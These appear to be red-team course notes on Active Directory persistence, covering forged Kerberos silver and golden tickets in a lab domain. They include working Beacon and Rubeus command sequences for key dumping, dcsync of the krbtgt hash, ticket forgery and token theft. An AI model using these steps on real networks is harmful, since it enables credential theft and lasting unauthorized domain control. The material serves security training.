# Domain Dominance

Once an attacker achieves a very high level of privilege in the domain, such as Domain or Enterprise Admin, it's very difficult for a defending organisation to recover or even consider the forest as "clean" again.  Attackers with this access can extract credential material from the domain and use it to re-obtain DA-level access at any time.  The majority of these credentials are never changed, which grants practically unlimited access.

## Silver Tickets

Forged service ticket signed using the secret keys of a computer. You can forge a TGS for any user to any service on that machine, which is useful for short/medium-term persistence. By default, computer passwords change every 30 days, at which time you must get the new secrets to continue making silver tickets. Tickets are forged, and can be generated by the attacker and imported into a Beacon session.

1: Dump Kerberos keys from Workstation 1 from a SYSTEM Beacon.

2: On the attacking machine, use Rubeus to forge a service ticket for nlamb and the CIFS service:

    PS C:\Users\Attacker> Rubeus.exe silver /service:cifs/wkstn-1.dev.cyberbotic.io /aes256:3ad3c... /user:nlamb /domain:dev.cyberbotic.io /sid:S-1-5-21-569305411-121244042-2357301523 /nowrap

import the ticket.

    beacon> getuid
    [*] You are DEV\bfarmer (admin)
    beacon> ls \\wkstn-1.dev.cyberbotic.io\c$
    [-] could not open \\wkstn-1.dev.cyberbotic.io\c$\*: 5 - ERROR_ACCESS_DENIED
    beacon> execute-assembly Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFXD...
    beacon> steal_token 5668
    [+] Impersonated DEV\bfarmer
    beacon> ls \\wkstn-1.dev.cyberbotic.io\c$

Useful ticket combinations:

* psexec:	HOST & CIFS
* winrm:	HOST & HTTP
* dcsync (DCs only):	LDAP

## Golden Tickets

Forged TGT signed by the domain's krbtgt account. Where a silver ticket can be used to impersonate any user, it's limited to either that single service or to any service but on a single machine. A golden ticket can be used to impersonate any user, to any service, on any machine in the domain, and the credentials are never changed automatically. For that reason, the krbtgt NTLM/AES hash is probably the single most powerful secret you can obtain (and is why you see it used in dcsync examples so frequently). Obtain the krbtgt hash by using dcsync from the context of a domain admin:

    beacon> dcsync dev.cyberbotic.io DEV\krbtgt

1: Forge the ticket offline using Rubeus:

    PS C:\Users\Attacker> Rubeus.exe golden /aes256:51d7f3... /user:nlamb /domain:dev.cyberbotic.io /sid:S-1-5-21-569305411-121244042-2357301523 /nowrap

2: Import into a logon session to use:

    beacon> execute-assembly Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFLz...
    beacon> steal_token 5060
    beacon> run klist
    beacon> ls \\dc-2.dev.cyberbotic.io\c$




